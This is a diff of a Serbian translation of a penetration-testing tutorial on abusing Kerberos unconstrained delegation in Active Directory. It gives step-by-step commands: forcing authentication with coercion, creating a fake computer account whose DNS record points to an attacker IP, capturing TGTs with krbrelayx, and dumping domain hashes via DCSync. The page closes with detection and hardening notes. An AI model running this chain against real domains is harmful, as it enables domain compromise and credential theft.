@@ -4,11 +4,11 @@
 
 ## Unconstrained delegation
 
-Ovo je funkcija koju Domain Administrator može da podesi na bilo kom **Computer** objektu unutar domena. Nakon toga, svaki put kada se **user prijavi** na taj Computer, **kopija TGT-a** tog user-a biće **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji LSASS-a**. Dakle, ako imate Administrator privilegije na toj mašini, moći ćete da **dump-ujete tikete i impersonirate user-e** na bilo kojoj mašini.
+Ovo je funkcija koju Domain Administrator može podesiti za bilo koji **Computer** unutar domena. Zatim, svaki put kada se **user prijavi** na Computer, **kopija TGT-a** tog korisnika biće **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji u LSASS-u**. Dakle, ako imate Administrator privilegije na mašini, moći ćete da **dump-ujete tikete i impersonirate korisnike** na bilo kojoj mašini.
 
 Ako se, dakle, Domain Administrator prijavi na Computer sa aktiviranom funkcijom "Unconstrained Delegation", a vi na toj mašini imate local admin privilegije, moći ćete da dump-ujete tiket i impersonirate Domain Administrator-a bilo gde (domain privesc).
 
-Možete **pronaći Computer objekte sa ovim atributom** proverom da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi pomoću LDAP filtera ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što upravo radi powerview:
+Možete **pronaći Computer objekte sa ovim atributom** tako što ćete proveriti da li [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) atribut sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi pomoću LDAP filtera ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što powerview i radi:
 ```bash
 # List unconstrained computers
 ## Powerview
@@ -30,39 +30,39 @@ kerberos::list /export #Another way
 Rubeus.exe dump
 Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
 ```
-Učitajte ticket Administratora (ili victim user-a) u memoriju pomoću **Mimikatz**-a ili **Rubeus**-a za [**Pass the Ticket**](pass-the-ticket.md)**.**\
-Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+Učitajte ticket korisnika Administrator (ili victim user) u memory pomoću **Mimikatz** ili **Rubeus** za [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
 [**Više informacija o Unconstrained delegation na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
 
 ### **Force Authentication**
 
-Ako attacker uspe da **kompromituje računar dozvoljen za "Unconstrained Delegation"**, može da **prevari** **Print server** da se **automatski prijavi** na njega, čime se **TGT** čuva u memoriji servera.\
-Zatim attacker može da izvrši **Pass the Ticket attack kako bi impersonirao** nalog računara Print servera.
+Ako napadač uspe da **kompromituje računar dozvoljen za "Unconstrained Delegation"**, mogao bi da **prevari** **Print server** da se **automatski prijavi** na njega, čime bi sačuvao **TGT** u memory-ju servera.\
+Zatim bi napadač mogao da izvrši **Pass the Ticket attack kako bi impersonirao** computer account Print servera.
 
-Da biste naterali Print server da se prijavi na bilo koji računar, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
+Da biste naterali print server da se prijavi na bilo koji računar, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
-Ako je TGT sa domain controllera, možete izvršiti [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i dobiti sve hash-eve sa DC-a.\
+Ako je TGT sa kontrolera domena, možete izvršiti [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i dobiti sve hash-eve sa DC-a.\
 [**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
 
-Ovde pronađite druge načine da **prinudite autentifikaciju:**
+Ovde pronađite druge načine da **iznudite autentikaciju:**
 
 
 {{#ref}}
 printers-spooler-service-abuse.md
 {{#endref}}
 
-Bilo koji drugi coercion primitive koji primorava žrtvu da se autentifikuje pomoću **Kerberos-a** na vaš unconstrained-delegation host takođe funkcioniše. U modernim okruženjima to često znači zamenu klasičnog PrinterBug toka sa **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ili coercion-om zasnovanim na **WebClient/WebDAV**, u zavisnosti od toga koja je RPC površina dostupna.
+Bilo koji drugi coercion primitive koji natera žrtvu da se autentikuje koristeći **Kerberos** na vašem hostu sa unconstrained delegation takođe funkcioniše. U modernim okruženjima to često znači zamenu klasičnog PrinterBug toka za **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ili coercion zasnovan na **WebClient/WebDAV**, u zavisnosti od toga koja je RPC površina dostupna.
 
-### Zloupotreba user/service account-a sa unconstrained delegation
+### Zloupotreba korisničkog/servisnog naloga sa unconstrained delegation
 
-Unconstrained delegation nije **ograničen samo na computer objekte**. **User/service account** takođe može biti konfigurisan kao `TRUSTED_FOR_DELEGATION`. U tom scenariju, praktični zahtev je da account mora primati Kerberos service tickets za **SPN koji poseduje**.
+Unconstrained delegation nije **ograničen samo na računarske objekte**. **Korisnički/servisni nalog** takođe može biti konfigurisan kao `TRUSTED_FOR_DELEGATION`. U tom scenariju, praktični zahtev je da nalog mora da prima Kerberos service tickets za **SPN koji poseduje**.
 
-Ovo vodi do 2 veoma česta ofanzivna pravca:
+Ovo vodi do 2 veoma česta napadačka pravca:
 
-1. Kompromitujete lozinku/hash unconstrained-delegation **user account-a**, a zatim tom istom account-u **dodate SPN**.
-2. Account već ima jedan ili više SPN-ova, ali jedan od njih pokazuje na **zastareli/dekomisionirani hostname**; ponovno kreiranje nedostajućeg **DNS A record-a** dovoljno je za hijacking toka autentifikacije bez menjanja SPN skupa.<sup>[[8]](#references)</sup>
+1. Kompromitujete lozinku/hash unconstrained-delegation **korisničkog naloga**, a zatim **dodate SPN** tom istom nalogu.
+2. Nalog već ima jedan ili više SPN-ova, ali jedan od njih pokazuje na **zastarelo/dekomisionirano ime hosta**; ponovno kreiranje nedostajućeg **DNS A record-a** dovoljno je za hijacking toka autentikacije bez menjanja skupa SPN-ova.<sup>[[8]](#references)</sup>
 
 Minimalni Linux tok:
 ```bash
@@ -92,17 +92,17 @@ secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
 ```
 Napomene:
 
-- Ovo je naročito korisno kada je unconstrained principal **service account**, a imate samo njegove kredencijale, bez code execution-a na joined host-u.
+- Ovo je posebno korisno kada je unconstrained principal **service account**, a imate samo njegove kredencijale, bez code execution-a na pridruženom hostu.
 - Ako ciljni korisnik već ima **stale SPN**, ponovno kreiranje odgovarajućeg **DNS record-a** može biti manje upadljivo od upisivanja novog SPN-a u AD.
-- Savremeni Linux-centric tradecraft koristi `addspn.py`, `dnstool.py`, `krbrelayx.py` i jednu coercion primitivu; nije potrebno da koristite Windows host da biste završili lanac.
+- Savremeni Linux-centric tradecraft koristi `addspn.py`, `dnstool.py`, `krbrelayx.py` i jednu coercion primitivu; za dovršavanje ovog lanca nije potrebno koristiti Windows host.
 
 ### Zloupotreba Unconstrained Delegation-a pomoću računara koji je kreirao napadač
 
-Moderni domeni često imaju `MachineAccountQuota > 0` (podrazumevana vrednost je 10), što svakom autentifikovanom principal-u omogućava da kreira do N computer objekata. Ako takođe posedujete `SeEnableDelegationPrivilege` token privilege (ili ekvivalentna prava), možete podesiti novokreirani computer tako da mu se veruje za unconstrained delegation i preuzimati dolazne TGT-ove sa privilegovanih sistema.<sup>[[1]](#references)</sup>
+Moderni domeni često imaju `MachineAccountQuota > 0` (podrazumevana vrednost je 10), što svakom authenticated principal-u omogućava kreiranje do N computer objekata. Ako takođe posedujete `SeEnableDelegationPrivilege` token privilege (ili ekvivalentna prava), možete podesiti novokreirani računar kao trusted for unconstrained delegation i prikupljati dolazne TGT-ove sa privilegovanih sistema.<sup>[[1]](#references)</sup>
 
 Tok na visokom nivou:
 
-1) Kreirajte computer koji kontrolišete
+1) Kreirajte računar pod svojom kontrolom
 ```bash
 # Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
 addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
@@ -114,13 +114,13 @@ python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
 --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
 -dns-ip <DC_IP> <DC_FQDN>
 ```
-3) Omogućite Unconstrained Delegation na računaru pod kontrolom napadača
+3) Omogućavanje Unconstrained Delegation na računaru pod kontrolom napadača
 ```bash
 # Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
 # BloodyAD example
 bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
 ```
-Zašto ovo funkcioniše: kod unconstrained delegation-a, LSA na računaru sa omogućenom delegacijom kešira dolazne TGT-ove. Ako prevarite DC ili privileged server da se autentifikuje na vašem lažnom hostu, njegov mašinski TGT će biti sačuvan i može se eksportovati.
+Zašto ovo funkcioniše: kod unconstrained delegation, LSA na računaru sa omogućenom delegacijom kešira dolazne TGT-ove. Ako prevarite DC ili privilegovani server da se autentifikuje na vaš lažni host, njegov mašinski TGT biće sačuvan i može se izvesti.
 
 4) Pokrenite krbrelayx u export režimu i pripremite Kerberos materijal
 ```bash
@@ -131,18 +131,18 @@ python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>
 # Alternative if you know the password and correct Kerberos salt:
 python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
 ```
-5) Iznudite autentikaciju od DC-a/servera ka vašem lažnom hostu
+5) Iznuditi autentikaciju sa DC/servera ka vašem lažnom hostu
 ```bash
 # netexec (CME fork) coerce_plus module supports multiple coercion vectors
 # Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
 netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
 ```
-krbrelayx će sačuvati ccache datoteke kada se računar autentifikuje, na primer:
+krbrelayx će sačuvati ccache fajlove kada se mašina autentifikuje, na primer:
 ```
 Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
 Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
 ```
-6) Iskoristite preuzeti TGT DC mašine za izvođenje DCSync-a
+6) Upotrebite uhvaćeni TGT DC machine-a za izvođenje DCSync-a
 ```bash
 # Create a krb5.conf for the realm (netexec helper)
 netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
@@ -156,26 +156,24 @@ netexec smb <DC_FQDN> --use-kcache --ntds
 KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
 secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
 ```
-Napomene i zahtevi:
-
-- `MachineAccountQuota > 0` omogućava kreiranje računara bez privilegija; u suprotnom su vam potrebna eksplicitna prava.
-- Postavljanje `TRUSTED_FOR_DELEGATION` na računaru zahteva `SeEnableDelegationPrivilege` (ili privilegije domain admin-a).
+- `MachineAccountQuota > 0` omogućava neprivilegovano kreiranje računara; u suprotnom su vam potrebna eksplicitna prava.
+- Podešavanje `TRUSTED_FOR_DELEGATION` na računaru zahteva `SeEnableDelegationPrivilege` (ili domain admin prava).
 - Obezbedite razrešavanje imena za vaš lažni host (DNS A zapis), kako bi DC mogao da mu pristupi putem FQDN-a.
-- Coercion zahteva funkcionalan vektor (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Ako je moguće, onemogućite ih na DC-ovima.
-- Ako je nalog žrtve označen kao **"Account is sensitive and cannot be delegated"** ili je član grupe **Protected Users**, prosleđeni TGT neće biti uključen u service ticket, tako da ovaj lanac neće omogućiti dobijanje ponovo upotrebljivog TGT-a.<sup>[[9]](#references)</sup>
-- Ako je **Credential Guard** omogućen na klijentu/serveru koji se autentifikuje, Windows blokira **Kerberos unconstrained delegation**, što iz perspektive operatora može dovesti do neuspeha inače validnih coercion putanja.
+- Coercion zahteva upotrebljiv vektor (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Ako je moguće, onemogućite ih na DC-ovima.
+- Ako je victim nalog označen opcijom **"Account is sensitive and cannot be delegated"** ili je član grupe **Protected Users**, prosleđeni TGT neće biti uključen u service ticket, tako da ovaj lanac neće rezultirati upotrebljivim TGT-om.<sup>[[9]](#references)</sup>
+- Ako je **Credential Guard** omogućen na klijentu/serveru koji obavlja autentifikaciju, Windows blokira **Kerberos unconstrained delegation**, što iz perspektive operatora može dovesti do neuspeha inače validnih coercion putanja.
 
 Ideje za detekciju i hardening:
 
-- Upozoravajte na Event ID 4741 (kreiran nalog računara) i 4742/4738 (izmenjen nalog računara/korisnika) kada je postavljen UAC `TRUSTED_FOR_DELEGATION`.
+- Upozoravajte na Event ID 4741 (kreiran computer nalog) i 4742/4738 (izmenjen computer/user nalog) kada je postavljen UAC `TRUSTED_FOR_DELEGATION`.
 - Nadgledajte neuobičajena dodavanja DNS A zapisa u domenskoj zoni.
-- Pratite nagle poraste broja 4768/4769 sa neočekivanih hostova i autentifikacije DC-ova prema hostovima koji nisu DC-ovi.
-- Ograničite `SeEnableDelegationPrivilege` na minimalan broj naloga, postavite `MachineAccountQuota=0` gde je izvodljivo i onemogućite Print Spooler na DC-ovima. Primenite LDAP signing i channel binding.
+- Pratite nagle poraste broja 4768/4769 sa neočekivanih hostova i DC autentifikacije prema hostovima koji nisu DC-ovi.
+- Ograničite `SeEnableDelegationPrivilege` na minimalan skup korisnika, postavite `MachineAccountQuota=0` gde je izvodljivo i onemogućite Print Spooler na DC-ovima. Primenite LDAP signing i channel binding.
 
-### Mitigation
+### Ublažavanje
 
 - Ograničite DA/Admin prijavljivanja na određene servise
-- Za privilegovane naloge postavite "Account is sensitive and cannot be delegated".
+- Za privilegovane naloge postavite **"Account is sensitive and cannot be delegated"**.
 
 ## Reference
 
